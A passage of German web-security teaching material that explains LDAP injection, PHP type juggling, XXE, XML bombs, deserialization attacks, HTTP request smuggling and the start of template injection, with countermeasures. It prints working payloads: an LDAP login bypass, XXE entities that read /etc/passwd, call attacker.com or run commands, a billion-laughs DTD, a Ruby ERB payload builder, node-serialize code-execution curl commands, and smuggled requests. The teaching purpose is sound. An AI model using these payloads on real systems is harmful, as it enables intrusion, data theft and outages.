standardisiertes Protokoll welches aktuell häufig für den Zugriff auf
Identifikations und Authentikationsdaten verwendet wird. Ein Angreifer
kann hier, ähnlich zu Datenbank-Injections, das Verketten von Strings
als Angriffsvektor verwenden.

LDAP verwendet Key-Value Pairs um Daten zu speichern, bzw. zu
identifizieren. Ein Beispiel:

    (cn=Andreas Happe, ou=IT Security, dc=technikum-wien, ec=at)

Abfragen werden mit Hilfe einiger Sonderzeichen gebildet, diese müssen
innerhalb von Datenfeldern nicht maskiert werden:

    * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! '

Abfragen werden in prefix Notation geschrieben, folgende Abfrage sucht
alle Namen, welche mit Andreas beginnen:

    (cn=Andreas*)

Mehrere Abfragen können mit logsischen Operatoren verknüpft werden, z.B.
sucht folgendes nach einem Namen der mit ‘Andreas’’ beginnt und mit
‘Happe’’ endet:

    (&(cn=Andreas*)(cn=*Happe))

Verwendet ein Entwickler eine ungesicherte String-Concatination zur
Erstellung einer Abfrage können, analog zu SQL-Injections, Fehler
geschehen.

Beispiel: wird ein Login über Benutzername und Passwort überprüft könnte
die dabei entstehende Abfrage folgend aussehen:

    (&(userID=happe)(password=trustno1))

Was passsiert, wenn der Angreifer *\*)(userID=\*))(\|(userID=\** als
Benutzername eingibt? Die resultierende Abfrage wäre:

    (&(userID=*)(userID=*))(|(userID=*)(password=anything))

Es entsteht eine Abfrage mit zwei Teilen die Und-verknüpft werden. Der
erste Part ist immer war (Tautologie). Aufgrund der Oder-Verknüpfung ist
auch der zweite Part immer war, in Summe ist der entstehende Ausdruck
immer wahr und somit kann der Login umgangen werden.

Weiter Informationen können dem Blog der Netsparker-Homepage[4]
entnommen werden.

## Type-Juggling Angriffe

Type Juggling Angriffe können in mehreren Programmiersprachen auftreten,
besonders “bekannt” ist dieser Angriffsvektor in PHP. Diese Angriffe
sind möglich, wenn durch eine automatische, implizite Typkonvertierung
das erwartete Resultat einer Operation verfälscht wird. In PHP liegt das
Grundproblem in den beiden Vergleichsoperatoren *==* (loose) und *===*
(strict), ersterer führt automatisch Typkonvertierungen durch und wird
leider häufig anstatt des sicheren zweiten Operators verwendet.

Wird z.B. server-seitig in PHP ein String mit einer Zahl verglichen,
wird der String automatisch in eine Zahl konvertiert, dies inkludiert
Hex- und Octal-Darstellungen von Zahlen:

| Operant A | Operant B | Ergebnis |
|:----------|:----------|:---------|
| "0000"    | int(0)    | true     |
| "0e42"    | int(0)    | true     |
| "1abc"    | int(1)    | true     |
| "abc"     | int(0)    | true     |
| "0xF"     | "15"      | true     |
| "0e1234"  | "0e5678"  | true     |

Dies kann verwendet werden, um Vergleiche “kurzzuschließen”, wie
folgendes Beispiel (aus einer älteren WordPress-Version) zeigen soll.
Hier wird die Benutzerauthorisierung über einen berechneten MAC
durchgeführt. Der Anwender setzt mehrere Werte über Cookies, die
Integrität dieser Werte wird durch einen berechneten MAC verifiziert.
Zur Berechnung des MACs wird ein geheimer Schlüssel (*key* in dem
Beispiel) verwendet, der nie den Server verlässt. Dies wird vereinfacht
durch folgenden server-seitigen Code umgesetzt:

    $hash = hash_mac('md5', $username . '|' . $expiration, $key);
    if ($hmac != $hash) {
        // bad cookie, give error
    } else {
        // accept operation
    }

*username*, *expiration* und *hmac* werden aus dem Cookie gelesen und
können dadurch durch den Angreifer bestimmt werden. Ein Angreifer kann
nun *username* auf *Administrator*, und *hmac* auf den Wert *0* setzen.
Nun kann er einen Brute-Force Angriff ausführen, bei dem das Ablaufdatem
(*expiration*) au feinen zufälligen Wert gesetzt wird. Der Angreifer
hofft, dass bei einem der Zugriffe zufällig als Hash ein Wert generiert
wird, der mit "0e…" beginnt, da hier automatisch eine Konvertierung des
Wertes auf *0* passieren würde. Dies entspricht dem übergebenen *hmac*
(der ebenso *0*) ist und eine server-seitige Administratoren-Identität
ist übernommen.

## XML-basierte Angriffe

Werden von einem Webserver XML-Daten entgegengenommen und serverseitig
bearbeitet, entstehen mehrere potentielle Angriffsvektoren. Zwei davon,
XML External Entities und XML-basierte DoS-Angriffe, werden in diesem
Kapitel betrachtet. Beide basieren darauf, dass XML ein komplexes
Datenformat besitzt welches durch einen ebenso komplexen Parser
serverseitig analysiert werden muss.

### XML External Entities

XML besitzt die Möglichkeit direkt innerhalb des XML-Dokuments
Typdefinitionen zu inkludieren. Diese DTD (Document Type Definition)
beginnt mit dem DOCTYPE Tag und kann auch External Entities definieren.
Diese External Entities sind Verweise auf externe Datenquellen, diese
werden durch den Parser automatisch in das XML-Dokument eingefügt.

Ein Beispiel für einen XML External Entities Angriff der auf die
Extraktion lokaler Daten zielt:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
      <!ELEMENT foo ANY>
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>

Bei diesem Beispiel wird ein neues Element (*foo*), und als möglicher
Wert für dieses Element die externe Datenquelle /etc/passwd als Referenz
*&xxe* definiert. Anschließend wird dieser Elementtyp auch sofort samt
der Referenz verwendet. Erlaubt ein Server das Parsen dieses
XML-Dokumentes würde er nun diese Datei auslesen, deren Inhalt in das
XML Dokument einfügen und ggf. das ausgefüllte Dokument an den Client
zurückgeben. Somit kann der Angreifer auf eine Datei, auf die er
eigentlich keinen Zugriff besitzen sollte mit den Rechten des
Applikationsservers zugreifen.

Ebenso kann auf eine Netzwerkadresse verwiesen werden:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >
    ]>
    <foo>&xxe;</foo>

In diesem Beispiel kann der Angreifer den XML-verarbeitenden Server dazu
bringen, mittels HTTP GET auf die übergebene URL
(<http://www.attacker.com/text.txt>) zuzugreifen. Dadurch ergeben sich
mehrere Angriffsmöglichkeiten:

-   Der Angreifer kann den Webserver zum “Besuch” einer Webseite
    bringen, bei diesem Besuch wird zumeist auch die öffentliche
    IP-Adresse des Webservers auf dem besuchten Webserver vermerkt. Bei
    Inhalten die z.B. gegen das Verbotsgesetz verstoßen kann dies
    negative Publicity für den Betreiber des XML-verarbeitenden
    Webservers bewirken.

-   Da der Zugriff vom XML-verarbeitenden Server ausgeht, kann der
    Angreifer einen HTTP GET Request auf interne Server absetzen, die
    ansonsten durch eine initiale Firewall blockiert gewesen wären.

-   Der Angreifer kann ebenso auf *localhost*, sprich dem eigenen
    Server, zugreifen. Häufig werden interne Administrationsprogramme so
    konfiguriert, dass diese nur auf Localhost lauschen (als
    Sicherheitsmassname um remote Angreifern den Zugriff zu
    unterbinden). Im Zuge eines XML External Entity basierten Angriffs
    kann ein Angreifer diesen Schutz aushebeln und direkt auf localhost
    zugreifen.

-   Bei einigen Protokollen (http, smb, cifs) werden automatisch Tokens
    und Credentials vom XML-verarbeitenden Server aus zum Zielserver
    verschickt. Ein Angreifer kann dies z.B. missbrauchen um bei einem
    Windows-basierten Server via SMB NTLM-Hashes zu extrahieren und
    gegen diese offline einen Brute-Force Angriff durchzuführen.

Ein XML External Entity kann auch auf virtuelle Adressen verweisen. So
wird z.B. vom PHP XML Parser als Schema *expect* angeboten. Bei diesem
Schema wird die übergebene URL als Systemkommando ausgeführt und dessen
Ergebnis in das XML-Dokument eingefügt. Ein Angreifer kann dies
missbrauchen um Systemkommands (Command Injection) auszuführen:

    <?xml version="1.0" encoding="ISO-8859-1"?>
      <!DOCTYPE foo [ <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "expect://id" >
    ]>
    <creds>
      <user>&xxe;</user>
      <pass>mypass</pass>
    </creds>

In diesem Fall wird als Benutzername die Ausgabe des
UNIX-Systemkommandos *id* eingefügt.

### Gegenmaßnahmen

Die bevorzugte Gegenmaßnahme ist es, den verwendeten Parser so zu
konfigurieren, dass er keinen Zugriff auf XML External Entities zulässt.
Häufig wird auch die Verwendung “einfacherer” Dokumentenformate als
Gegenmaßnahme vorgeschlagen: dies ist allerdings IMHO nicht der beste
Weg, da auch die Parser einfacher Dokumentenformate (wie z.B. CSV und
JSON) ebenso Schwachstellen besitzen.

### Denial-of-Service Attacks

Ein weiteres Problem von External Entities ist es, dass hierdurch
schnell tiefe und breite Datenstrukturen aufgebaut werden können.
Versucht ein Parser nun diese Datenstruktur in-memory zu bauen, kann ein
Parser sehr schnell out-of-memory gehen und dadurch einen
Speicher-basierten DoS-Angriff durchführen.

Ein bekanntes Beispiel sind Million-Laugh Angriffe:

    <!DOCTYPE root [
     <!ELEMENT root ANY>
     <!ENTITY LOL "LOL">
     <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
     <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
     <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
     <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
     <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
     <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
     <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
     <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
     <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;"> 
    ]>
    <root>&LOL9;</root>

Bei dieser Angriffsart wird LOL9 durch 10 Elemente des Types LOL8
ersetzt. Jedes dieser 10 LOL8 Elemente wird mit mit 10 LOL7 Elementen
gebaut, etc. In Summe erzeugt dieses DTD rund drei Milliarden LOL
Elemente. Falls ein Parser versucht diese im Arbeitsspeicher zu
erstellen, wird dieser mit hoher Wahrscheinlichkeit nicht ausreichend
sein.

## Serialisierungsangriffe

Die Serialisierung dient dazu, aus einem Objekt einer Programmiersprache
zur Laufzeit eine Textrepresentation zu erstellen. Diese kann dann
gespeichert oder übertragen werden. Zu einem späteren Zeitpunkt kann aus
dieser Textrepresentation wieder ein Programmiersprachen-Objekt erstellt
und diese innerhalb einer Webapplikation verwendet werden.

Das grundsätzliche Problem ist, dass ein Angreifer das serialisierte
Dokument abfangen und modifizieren kann. Auf diese Weise kann er das
wieder-erstellte Objekte indirekt modifizieren oder auch während (oder
nach) der Deserialisierung Schadcode zur Ausführung bringen.

Hier ein einfaches Beispiel eines serialisierten Objekts in PHP (als
auch eines modifizierten serialisierten Objekts). Die Annahme ist, dass
ein Webserver die Daten des aktuellen Benutzers serialisiert, diese in
einer Browser-Session client-seitig speichert und bei jedem
Client-Zugriff das de-serialisierte Objekt verwendet um wieder das
User-Objekt zu bauen:

    # Serialisiertes Objekt
    a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

    # Modifiziertes Serialisiertes Objekt
    a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

In dem Beispiel wird ein einfaches Serialisierungsformat verwendet,
String Elemente werden in der Form *s:Länge:Inhalt* verwendet. Ein
Angreifer würde z.B. innerhalb des Browsers diese serialisierten Daten
modifizieren und z.B. aus dem String “user” (Länge 4) den String “admin”
(Länge 5) machen und versuchen auf diese Weise eine Privilege Escalation
durchzuführen.

Weitaus schwerwiegendere Angriffe sind ebenso möglich:

-   Es gibt in PHP (wie in den meisten Programmiersprachen) Methoden,
    die automatisch beim Erstellen bzw. Vernichten von Objekten
    aufgerufen werden. Ein Angreifer kann anstatt (wie bei dem angegeben
    Beispiel) einen Stringwert zu verändern, den Stringwert mit einem
    serialisierten Objekt ersetzen. Dieses Objekt muss nur eine (bei der
    Serialisierung automatisch aufgerufene) Methode besitzen, die auf
    eine Variable zugreift und diese als Code ausführt. Der Angreifer
    würde im serialisierten Objekt nun den Wert dieser Variable auf den
    Schadcode setzen und dadurch beim Deserialisieren eine serverseitige
    Code-Execution erzeugen.

-   Es können auch serialisierte Objekte mit Objektreferenzen gebaut
    werden. Problematisch ist, dass die referenzierten Objekte während
    der Deserialisierung auch Daten wieder freigeben können, man über
    die Objektreferenz allerdings noch auf diese zugreifen kann. Dies
    führt zu *use-after-free* Bugs die für *memory corruption*-basierte
    Angriffe ausgenutzt werden können.

### Serialisierungsangriffe in Java

Serialisierung innerhalb des Java-Ökosystems besitzt das Problem, dass
bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird
und erst danach der Typ, etc. des Objekts überprüft werden kann. Hier
ein Beispiel:

    InputStream is = request.getInputStream();
    ObjectInputStream ois = new ObjectInputStream(is);
    AcmeObject acme = (AcmeObject)ois.readObject();

Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem
nicht-vertrauenswürdigem Dokument ein neues Java-Objekt erstellen muss.
Ein Angreifer kann dies z.B. für einen einfachen DoS missbrauchen. So
erstellt folgender Java-Code z.B. mehrere Hashes die ineinander
verknüpft werden. Während solch ein Konstrukt gebaut und serialisiert
werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem
Speicherverbrauch beim Deserialisieren und bringt dadurch das Java
Runtime Environment zum Absturz:

    Set root = new HashSet();
    Set s1 = root;
    Set s2 = new HashSet();

    for (int i = 0; i < 100; i++) {
      Set t1 = new HashSet();
      Set t2 = new HashSet();
      t1.add("foo"); // make it not equal to t2
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }

### Serialisierungsangriffe in Ruby on Rails

Ruby (on Rails) besitzt eine längere Historie von
Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails
*ERB* Klasse. Diese Klasse besitzt ein Element src in welchem
Base64-codierter Source Code enthalten sein kann. Dieser Source Code
wird bei Aufruf der Methode *result* eines ERB-Objektes intern
aufgerufen.

Ruby verwendet ein in XML-eingepacktes JSON-Dokument als
Serialisierungsformat. Ein Angreifer könnte z.B. folgendes Dokument
bauen, welches einem serialisierten ERB Objekt entspricht:

    code  = File.read(ARGV[1])

    # Construct a YAML payload wrapped in XML
    payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
    <fail type="yaml">
    --- !ruby/object:ERB
     template:
        src: !binary |-
            #{Base64.encode64(code)}
    </fail>
    PAYLOAD

Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird
durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument
welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit
dem Schadcode befüllt und falls die Webapplikation, welche dieses
serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und
auf die *result* Methode zugreift wird der bösartige Code des Angreifers
ausgeführt. Dies entspricht einer Remote Command Injection, basierend
auf einem Serialisierungsfehler.

### Serialisierungsangriffe in Javascript / Node.js

Ein schönes Beispiel für Serialisierungsangriffe ist folgende *node.js*
Applikation welche die Serialisierungsbibliothek *node-serialize*
verwendet:

    const express = require('express');
    const bodyParser = require('body-parser');
    const serialize = require('node-serialize');

    const app = express();

    app.use(bodyParser.urlencoded({ extended: false }));

    app.post("/api/deserialize", function(req, res) {
        var str = ""+req.body.fubar;
          const todo = serialize.unserialize(str);
          console.log(todo);
          res.send("wohoo!");
    });

    const server = app.listen(3000, function() {
          console.log("Server started! (Express.js)");

            // Beispiel eines "normalen" serialisierten Objekts
            const normal = {
                todo: "some string"
            };
          console.log("serialized normal object" + serialize.serialize(normal));
    });

Bei diesem Beispiel wird vom Server als Parameter ,,fubar” ein
serialisiertes Objekt als Text entgegen genommen, deserialisiert und
ausgegeben. Das erwartete serialisierte Object wird nun über das
Kommandozeilentool *curl* an den Server übertragen:

    $ curl -X POST -d "fubar={\"todo\":\"some string\"}" http://localhost:3000/api/deserialize

    # Ausgabe am Server:
    Server started! (Express.js)
    serialized normal object: {"todo":"some string"}
    serialized attack code: {"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}

    { todo: 'some string' }

In Javascript kann eine Klasse/Objekt auch eine Funktion als Element
besitzen. Folgende Klasse inkludiert z.B. unter dem Namen ,,todo” nicht
ein Attribut, sondern eine ausführbare Funktion:

            // Beispiel eines serialisierten Objekts mit einer aufrufbaren Funktion
          const todo = {
                todo : function() {
                    // child_process kann verwendet werden um eine ausführbare Datei aufzurufen
                    require('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})
                }
            };

Wird diese Klasse serialisiert, wird folgender serialisierter Text
erstellt:

    {"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}

Dieser inkludiert das Ausführen eines Befehls (,,ls /bin”) in der
Hoffnung, dass beim deserialisieren dieser Befehl am Server aufgerufen
werden würde. Dieses Kommando wird nun ebenso über curl an den Server
übertragen:

    # Die Zeichen \ und $ mussten teilweise maskiert werden
    $ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}\"}" http://localhost:3000/api/deserialize

    # Ausgabe am Server:

    { todo: [Function (anonymous)] }

Das Objekt wurde deserialisiert (inkl. der Methode mit dem Schadcode),
würde diese Methode während der Request-Abarbeitung aufgerufen werden,
würde unser Kommando am Server exekutiert werden. Wir können diesen
Exploit noch verbessern indem wir durch Anhängen von ,,()” nicht nur
eine Funktion definieren, sondern diese auch direkt aufrufen. Dies würde
folgendem serialiserten String bzw. folgendem Curl-Aufruf entsprechen:

    $ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}()\"}" http://localhost:3000/api/deserialize

Die Ausgabe am Server zeigt nun, dass das Kommando ausgeführt, und der
Inhalt von */bin* ausgegeben wurde:

    { todo: undefined }                                                                                                                         
    [                                                                                                                                           
    2to3-2.7                                                              
    aa-enabled                                                                                                                                  
    aa-exec                                                               
    aa-features-abi                                                       
    aconnect                                                              
    acpi_listen                                                           
    add-apt-repository                                                    
    addpart                                                               
    addr2line                                                             
    afm2pl                                                                
    afm2tfm                                                               
    ag                                                                    
    aleph
    ...

### Gegenmaßnahmen

Die Grundidee ist es, dass der Entwickler vor der Deserialisierung
definieren muss, welche validen Objekttypen bei der Deserialisierung
vorkommen dürfen. Wie und ob dies überhaupt möglich ist, ist allerdings
von der verwendeten Programmiersprache abhängig — z.B. muss bei älteren
Java-Versionen eine externe Serialisierungsbibliothek[5] verwendet
werden um ein sicheres Verhalten zu erzielen.

Zusätzlich müssen serialisierte Daten einer Integritätssicherung
unterzogen werden (z.B. mittels einer Signatur oder eines MACs) damit
ein Angreifer die serialisierten Daten nicht verändern kann.

Da diese Sicherungsmassnahmen teilweise schwer umsetzbar sind, empfiehlt
OWASP, dass Daten nur deserialisert werden dürfen, wenn diese aus einer
authentischen und integritäts-geschützen Quelle kommen. Dadurch wird
allerdings das Grundproblem nicht gelöst, sondern wird die Verantwortung
und das Problem nur zu dem Anwender, der die Deserialisierung anstößt,
verschoben. Falls ein Angreifer das Konto dieses Anwenders übernehmen
kann, erlangt er wiederum die Möglichkeit eine Deserialisierungattacke
durchzuführen.

### HTTP Request Smuggling

Bei HTTP Request Smuggling versucht der Angreifer, einzelne HTTP
Requests in ein System einzuschleusen. Der Angriff erfolgt nicht direkt
gegen eine Webapplikation an-sich, sondern nutzt aus, dass bei modernen
Webapplikationen zumeist mehrere Server involviert sind.Das HTTP
verwendet eine nicht-eindeutige Kodierung der Request-Länge, HTTP
Request Smuggling tritt auf, wenn die verschiedenen Server bei dem
indenten Request von unterschiedlichen Request-Längen ausgehen und daher
diesen Request unterschiedlich zusammensetzen.

Ein typisches Setup besteht aus einem Frontend- und einem einem
Backend-Server. Das Frontend dient zumeist zum Cachen von Daten oder
auch zur Zugriffskontrolle. Das Backend beinhaltet den
Applikationsserver welcher schlussendlich den Request innerhalb des
Applikationscodes behandelt. Problematisch ist, dass ein Frontend-System
die Anfragen mehrerer Clients (Web-Browser) parallel entgegen nimmt und
diese über eine Verbindung an ein Backend-System weiterleitet. Die
Verwendung einer TCP-Verbindung geschieht zumeist aus
Performancegründen, da das wiederholte Aufbauen einer Verbindung
zeitaufwendig wäre. Da nur nur eine Verbindung verwendet wird, müssen
Requests unterschiedlicher Browser nacheinander über diese Verbindung
übertragen werden. Das Backend-System empfängt nun über diese Verbindung
die Anfragen, muss diese erneut in einzelne Requests zerlegen und
schlussendlich abarbeiten. Damit das Backend die Grenzen der einzelnen
Requests identifizieren kann, wird die Längenangabe innerhalb der
Requests verwendet.

HTTP beeinhaltet zwei Möglichkeiten die Requestlänge zu definieren:

1.  Der HTTP-Header *Content-Lenght* beinhaltet die Länge des
    Request-Bodies.

2.  Wird als HTTP-Header *Transfer-Encoding: chunked* verwendet, gibt es
    keinen Header mit der Länge des Requestbodies. Anstatt dessen können
    als Requestbody mehrere Chunks übertragen werden. Ein Chunk besteht
    immer aus einer initialen Zeile mit der Länge der Daten innerhalb
    des aktuellen Chunks. Diese Länge wird in hexadezimal Notation
    übergeben. Direkt an die Zeile mit der Länge werden Daten
    (entsprechend der übertragenen Länge) angehängt. Ein Chunk wird mit
    einer Leerzeile beendet. Schlussendlich wird der Reqeust mit einem
    Chunk der Länge 0 beendet.

Der Fall, dass sowohl *Content-Length* als auch *Transfer-Encoding:
chunked* gesetzt sind, wurde im HTTP-Standard nicht definiert.
Dementsprechend reagieren unterschiedliche Server auch unterschiedlich
auf solche Requests. Dies kann von einem Angreifer ausgenutzt werden.

Zwei einfache Beispiele[6] sollen dieses Verhalten erläutern.

Nehmen wir initial an, dass das Frontend *Content-Length* und das
Backend *chunked encoding* verwendet. Folgender Request wird empfangen:

     POST / HTTP/1.1
     Host: vulnerable-website.com
     Content-Length: 13
     Transfer-Encoding: chunked

     0

     SMUGGLED 

Das Frontend würde (aufgrund des *Content-Length: 11* Headers) die
gesamte Nachricht auf die Verbindung zum Backend kopieren. Ein
paralleler Request eines zweiten Benutzers wird direkt danach auf die
gleiche Leitung kopiert. Das Backend liest den Request, verwendet aber
*Chunked Encoding*. Aufgrund des 0-Chunks (die initiale 0-Zeile) beendet
es den ersten Request nach der Leerzeile (nach der 0) und verwendet den
Rest der Eingabe als Beginn eines neuen Requests (der daher mit “
SMUGGLED” beginnt). Der parallele Request eines anderen Benutzers wird
direkt an den eingeschleusten Request als String angehängt und wird
dadurch Teil des eingeschleusten Requests.

Der umgekehrte Fall: Frontend verwendet *Chunked-Encoding*, Backend
verwendet *Content-Length* funktioniert ähnlich:

    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 3
    Transfer-Encoding: chunked

    8
    SMUGGLED
    0

Hier wird allerdings eine Zeile mit 0 zwischen dem eingeschleusten
Request und dem dazu-kopierten Folgerequest eines anderen Benutzers
eingefügt (da das Chunked-Encoding diese Zeile zum Beenden des Requests
benötigt). Dies muss der Angreifer bei der Erstellung seines
Angriffscodes berücksichtigen.

Wie kann dieses Verhalten bei einem Angriff ausgenutzt werden? Ein
schönes Beispiel wäre eine Webapplikation, bei dem ein Benutzer
Kommentare absetzen kann. Das Registrieren eines Benutzers ist auch für
einen Angreifer möglich. Hier könnte z.B. folgender Request als Angriff
verwendet werden[7]:

    GET / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 324

    0

    POST /post/comment HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 400
    Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

    csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=

Unter der Annahme, dass das Frontend *Content-Length* und das Backend
*Chunked-Encoding* verwendet würde folgendes passieren:

-   Das Frontend kopiert den gesamten Request auf die Verbindung zum
    Backend.

-   Das Backend versucht den Request zu erkennen, verwendet dafür
    *Chunked-Encoding* und beendet den Request mit dem 0-Chunk.

-   Das Backend liest die nächste Zeile Text und interpretiert diese als
    Beginn eines neuen Requests. In diesem Fall wäre dies ein POSt
    Request auf <a href="/post/comment" class="uri">/post/comment</a>.

-   Da der Angreifer selbst ein Konto erstellen konnte, konnte dieser
    eine valide Session als auch ein valides CSRF-Token generieren. Die
    Session wird als HTTP-Header eingeschleust. Innerhalb des
    eingeschleusten Requests wird auch das bekannte CSRF-Token gesetzt.

-   Innerhalb des eingeschleusten Requests wird mit einem Request-Body
    begonnen. In diesem werden mehrere Parameter gesetzt. Der
    eingeschleuste Request endet mit einem *comment=*, also dem Wert der
    als Kommentar vom User eingegeben werden sollte.

-   Da das Backend nicht weiss, dass der Request beendet ist, liest es
    die nächsten Daten aus der eingehenden Verbindung. In diesem Fall
    ist dies ein Request eines anderen Benutzers, der zeitgleich
    abgegeben und vom Frontend direkt nach dem eingeschleusten Reqeust
    in die Verbindung kopiert wurde.

-   Die Applikationslogik interpretiert nun den Folgerequest als Inhalt
    des Parameters *comment*, also als Kommentar der als Kommetar
    gepostet werden sollte (da die Operation
    <a href="/comment/post" class="uri">/comment/post</a> war).

-   Der Angreifer überprüft nun, ob ein neuer Kommentar mit sensiblen
    Daten eines anderen Users an der betroffenen Stelle auftaucht.
    Sensible Daten könnte z.B. Credentials im Zuge einer Login-Operation
    oder auch ein HTTP-Header mit Session-Cookies sein. Falls möglich,
    würde der Angreifer diese Verwenden um serverseitig die Identität
    des anderen Benutzers anzunehmen.

-   Falls kein Kommentar erscheint oder der Kommentar nur sinnlose
    Informationen beinhaltet, wiederholt der Angreifer den
    Angriffsrequest (potentiell würde er ein neues CSRF-Token initial
    generieren).

Was kann man gegen HTTP Request Smuggling Angriffe unternehmen? Mehrere
Möglichkeiten würden diese unterbinden;

-   Sicherstellen, dass Front- und Backend die Request-Länge ident
    interpretieren.

-   Am Frontend potentiell mehrdeutige Request-Längen mit eindeutigen
    Längen ersetzen.

-   Zwischen Front- und Backend für jeden Client-Request eine neue
    Verbindung aufbauen. Dies wird zumeist aus Performance-Gründen nicht
    durchgeführt.

-   Zwischen Front- und Backend HTTP/2 verwenden. Diese Protokollversion
    besitzt die Mehrdeutigkeit der Requestlängen nicht mehr.

## Server-Side Template Injection (SSTI)

Web-Applikationen verwenden Template-Engines um dynamische Inhalte zu
präsentieren. Anstatt eine Seite starr zu kodieren, wird ein Template
server-seitig in einer Datenbank gespeichert (z.B. als String/Text).
Wird die Seite angezeigt, wird das Template mit den aktuellen Daten
kombiniert und die resultierende Seite angezeigt. Häufig können
eingeloggte Benutzer (im Folgenden Autoren genannt) Templates
server-seitig modifizieren und auf diese Weise das Layout modifizieren.

Durch die Verwendung von Templates ergeben sich Vorteile:

-   Content-Autoren können Templates modifizieren (z.B. mittels eines
    WYSIWYG–Editor innerhalb des Administrationsbereichs) ohne auf den
    Source-Code der Applikation Zugriff zu benötigen.

-   Die verwendeten Template-Sprachen sind zumeist einfacher als
    ,,volle” Programmiersprachen und können daher auch leichter
    angelernt werden und erlauben es so einem größeren Benutzerkreis die
    Inhalte der Webseite zu modifzieren.

-   Die Daten, auf welche ein Template zugreifen kann, können limitiert
    werden. Auf diese Weise können Content-Autoren nur auf ein Subset
    der server-seitigen Daten zugreifen.

Natürlich ergeben sich auch Angriffsmöglichkeiten. Kann ein Angreifer
ein Template modifizieren und anschließend zur Ausführung bringen,
besitzt er die Möglichkeit am Server Code (innerhalb der
Template-Engine) auszuführen. Nun benötigt er noch die Möglichkeit, aus
dem Template-System auszubrechen und in der zugrunde liegenden Umgebung
(z.B. in die Web-Applikation) Befehle auszuführen. Dies wäre dann eine
Remote Command Execution (RCE).

### Beispiel Template System: Jinja (Python)

Eine häufig verwendete Template Engine in Python-basierten
Web-Applikationen ist Jinja[8]. In einem Template werden primär zwei
verschiedene Kommando-Tags zum Inkludieren von Daten bzw. Kommandos
verwendet:

    <ul>
        {% for item in somelist %}
          <li> {{ item }} </li>
        {% endfor %}
    </ul>

Dieses Jinja/HTML-Fragment baut eine Aufzählungsliste (mittels dem
ul-Tag). Es verwendet Template-Tags um eine Python-for-Schleife zu
inkludieren. Diese Schleife iteriert über die somelist Liste und
inkludiert jedes Item in einem li-Element.

### Exploitation

In einem typischen Szenario hat der Angreifer bereits Zugriff auf ein
System erlangt und kann sowohl ein Template bearbeiten als auch
ausführen. Dies kann z.B. durch Erlangen eines CMS-Autor-Accounts
innerhalb der Weboberfläche geschehen. Innerhalb dieser Oberfläche kann
der Angreifer ein Template (z.B. für versendete Emails) modifizieren als
auch, z.B. als ,,Preview”, anzeigen (und dadurch das Template zur
Exekution bringen).

Der Angreifer verwendet hierfür z.B. die gezeigen {{ …}} Tags. Er
besitzt allerdings nur Zugriff auf Objekte, welche in das Template vom
System hinein übergeben wurden. Bei unserem Beispiel wäre dies die Liste
somelist. Hier kann er allerdings das Python-Typsystem ausnutzen um
Zugriff auf weitere Objekte zu erlangen. Schlussendlich will der
